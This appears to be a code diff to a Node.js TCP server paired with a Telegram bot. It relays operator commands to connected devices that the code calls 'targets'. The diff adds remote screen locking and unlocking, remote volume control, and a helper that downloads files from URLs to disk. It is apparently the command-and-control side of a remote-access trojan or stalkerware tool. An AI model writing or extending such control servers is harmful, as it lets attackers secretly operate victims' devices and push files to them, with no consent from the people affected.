@@ -1,7 +1,10 @@
-const net = require("net");
-const os = require("os");
-const TelegramBot = require("node-telegram-bot-api");
-const { UserDataTransform } = require("../transform");
+const net                     = require("net");
+const os                      = require("os");
+const fs                      = require("fs");
+const https                   = require("https");
+const http                    = require("http");
+const TelegramBot             = require("node-telegram-bot-api");
+const { UserDataTransform }   = require("../transform");
 
 const udt = new UserDataTransform();
 const networkInterfaces = os.networkInterfaces();
@@ -47,6 +50,24 @@ function getServerIP(){
         }
         if (ipAddress){ return ipAddress; }
     }
+}
+
+function downloadFile(fileUrl, filePath){
+    https.get(fileUrl, (response) => {
+        if (response.statusCode === 200) {
+            const fileStream = fs.createWriteStream(filePath);
+            response.pipe(fileStream);
+            fileStream.on('finish', () => {
+                fileStream.close();
+                console.log('Download completed successfully.');
+            });
+        } else {
+            console.log(`Failed to download file: ${response.statusCode}`);
+        }
+    }).on('error', (err) => {
+        console.error(`Error: ${err.message}`);
+    });
+    
 }
 
 const getUsersByPort = async (portname, callback = () => {}) => {
@@ -347,6 +368,32 @@ const getInstalledApps = async (portname, passname, devid, shortcut, callback = 
     })
 }
 
+const setSoundVolume = async (portname, passname, devid, volume, shortcut, callback = () => {}) => {
+    await getUserByDeviceId(portname, devid, async (user) => {
+        if (user.status == false){
+            callback({
+                status: false,
+                method: "setSoundVolume",
+                message: "USER_NOT_FOUND",
+                device_id: devid
+            });
+            return;
+        }
+
+        user.user.socket.write(JSON.stringify({
+            port: portname,
+            password: passname,
+            method: "setSoundVolume",
+            volume: volume,
+            shortcut: shortcut
+        }));
+
+        callback({
+            status: true
+        });
+    })
+}
+
 const server = net.createServer(async (socket) => {
     socket.on('data', async (data) => {
         try{
@@ -566,6 +613,26 @@ const server = net.createServer(async (socket) => {
                                 })
                             }
 
+                            if (message.method == "setSoundVolume"){
+                                await setSoundVolume(message.port, message.password, message.device_id, message.volume, message.shortcut, async (dt) => {
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
+                                })
+                            }
+
                         })
                     } else {
                         socket.write(JSON.stringify({
@@ -760,6 +827,102 @@ const server = net.createServer(async (socket) => {
                                     return;
                                 }
                             }
+                        } else if (message.method == "lockScreen"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔒 ${sym} targets screen locked successfully !`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔒 ${sym} targets screen locked successfully !`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        } else if (message.method == "unlockScreen"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔓 ${sym} targets screen unlocked successfully !`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔓 ${sym} targets screen unlocked successfully !`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        } else if (message.method == "setSoundVolume"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔊 ${sym} volume seted for your target `) + message.device_id + build(`\n🌪 ${sym} volume is ${message.shortcut.volume} now`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔊 ${sym} volume seted for your target `) + message.device_id + build(`\n🌪 ${sym} volume is ${message.shortcut.volume} now`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
                         }
                     } else {
                         socket.write(JSON.stringify({
@@ -803,4 +966,8 @@ server.listen(9932, "0.0.0.0", () => {
     if (!getCurrentIp == "127.0.0.1"){
         console.log(`[B] socket-connection -> ${getCurrentIp}:9932`);
     }
+})
+
+process.on("uncaughtException", async (err) => {
+    console.error("[B] error detected:", err);
 })
